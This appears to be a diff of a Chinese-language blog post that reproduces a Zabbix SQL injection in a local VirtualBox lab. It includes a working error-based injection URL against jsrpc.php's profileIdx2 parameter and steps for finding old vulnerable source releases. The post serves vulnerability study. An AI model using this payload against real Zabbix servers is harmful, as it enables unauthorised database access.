@@ -34,27 +34,27 @@
 <li>为了使宿主机能访问虚拟机中的服务，需要配置端口转发</li>
 <li>管理 → 全局设定 → 网络，添加以下网络</li>
 </ul>
-<p><img src="1e08122a4e17204393cbe4c3baada553.png" alt="img"></p>
+<p><img src="1e08122a4e17204393cbe4c3baada553.png" alt=""></p>
 <ul>
 <li>选择虚拟机 → 设置 → 网络 → 高级 → 端口转发</li>
 </ul>
-<p><img src="fe122075b5ed0f730a9a4e81127f14a3.png" alt="img"></p>
+<p><img src="fe122075b5ed0f730a9a4e81127f14a3.png" alt=""></p>
 <ul>
 <li>宿主机就可以通过 <code>http://127.0.0.1:8080</code> 访问服务了</li>
 </ul>
 <h1 id="测试漏洞"><a href="#测试漏洞" class="headerlink" title="测试漏洞"></a>测试漏洞</h1><ul>
 <li>访问 <code>http://127.0.0.1:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</code></li>
 </ul>
-<p><img src="ef2611aa901498231056ef7355598a19.png" alt="img"></p>
+<p><img src="ef2611aa901498231056ef7355598a19.png" alt=""></p>
 <h1 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h1><h2 id="下载旧版本源码"><a href="#下载旧版本源码" class="headerlink" title="下载旧版本源码"></a>下载旧版本源码</h2><ul>
 <li>在zabbix官网放出来的源码都是已经修复好漏洞的版本，找了很久也没找到存在漏洞的版本</li>
 </ul>
-<p><img src="256eb7807ead48cdaba7d135752dd583.png" alt="img"></p>
+<p><img src="256eb7807ead48cdaba7d135752dd583.png" alt=""></p>
 <ul>
 <li>后来发现它的下载链接是这样的 <code>https://cdn.zabbix.com/zabbix/sources/oldstable/2.2/zabbix-2.2.23.tar.gz</code></li>
 <li>于是访问上级目录 <code>https://cdn.zabbix.com/zabbix/sources/oldstable/2.2/</code>，发现了老版本</li>
 </ul>
-<p><img src="6856f0adbe4996b84271b4abbd02cd37.png" alt="img"></p>
+<p><img src="6856f0adbe4996b84271b4abbd02cd37.png" alt=""></p>
 <ul>
 <li>下载 <a href="https://cdn.zabbix.com/zabbix/sources/oldstable/2.2/zabbix-2.2.10.tar.gz" target="_blank" rel="noopener">zabbix-2.2.10</a></li>
 </ul>
